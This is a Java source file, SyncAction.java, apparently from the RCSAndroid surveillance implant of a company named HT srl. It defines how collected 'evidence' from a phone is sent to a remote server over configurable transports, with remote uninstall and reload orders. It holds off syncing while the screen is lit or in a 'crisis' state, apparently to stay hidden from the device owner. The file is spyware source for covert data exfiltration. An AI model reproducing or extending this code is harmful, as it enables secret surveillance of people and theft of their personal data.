/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SyncAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.util.Vector;

import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.action.sync.Protocol;
import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
import com.ht.RCSAndroidGUI.action.sync.Transport;
import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
import com.ht.RCSAndroidGUI.agent.AgentConf;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public abstract class SyncAction extends SubAction {

	private static final String TAG = "SyncAction";

	/** The log collector. */
	protected EvidenceCollector logCollector;

	/** The agent manager. */
	protected AgentManager agentManager;
	// protected Transport[] transports = new Transport[Transport.NUM];
	/** The transports. */
	protected Vector transports;

	/** The protocol. */
	protected Protocol protocol;

	/** The initialized. */
	protected boolean initialized;
	/** The debug. */
	protected static Debug debug = new Debug("SyncAction");
	/**
	 * Instantiates a new sync action.
	 * 
	 * @param actionId
	 *            the action id
	 * @param confParams
	 *            the conf params
	 */
	public SyncAction(final int actionId, final byte[] confParams) {
		super(actionId, confParams);

		logCollector = EvidenceCollector.self();
		agentManager = AgentManager.self();
		transports = new Vector();

		protocol = new ZProtocol();
		initialized = parse(confParams);
		initialized &= initTransport();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		Check.requires(protocol != null, "execute: null protocol");
		Check.requires(transports != null, "execute: null transports");
		
		if (status.synced == true) {
			Log.d(TAG,"Warn: " + "Already synced in this action: skipping");
			return false;
		}

		if (status.crisisSync()) {
			Log.d(TAG,"Warn: " +"SyncAction - no sync, we are in crisis");
			return false;
		}

		// #ifndef DEBUG
		if (status.backlight()) {
			return false;
		}
		
		wantReload = false;
		wantUninstall = false;

		agentManager.reload(AgentConf.AGENT_DEVICE);

		boolean ret = false;

		for (int i = 0; i < transports.size(); i++) {
			final Transport transport = (Transport) transports.elementAt(i);
			Log.d(TAG,"execute transport: " + transport);
			Log.d(TAG,"transport Sync url: " + transport.getUrl());
			
			if (transport.isAvailable()) {
				Log.d(TAG,"execute: transport available");
				protocol.init(transport);

				try {
					ret = protocol.perform();
					wantUninstall = protocol.uninstall;
					wantReload = protocol.reload;
				} catch (final ProtocolException e) {
					Log.d(TAG,"Error: " + e.toString());
					ret = false;
				}
				
				Log.d(TAG,"execute protocol: " + ret);
			} else {
				Log.d(TAG,"execute: transport not available");
			}

			if (ret) {
				Log.d(TAG,"Info: SyncAction OK");
				Evidence.info("Synced with url:" + transport.getUrl());
				status.synced = true;
				return true;
			}
			
			Log.d(TAG,"Error: SyncAction Unable to perform");
		}

		return false;
	}

	/**
	 * Parses the.
	 * 
	 * @param confParams
	 *            the conf params
	 * @return true, if successful
	 */
	protected abstract boolean parse(final byte[] confParams);

	/**
	 * Inits the transport.
	 * 
	 * @return true, if successful
	 */
	protected abstract boolean initTransport();
}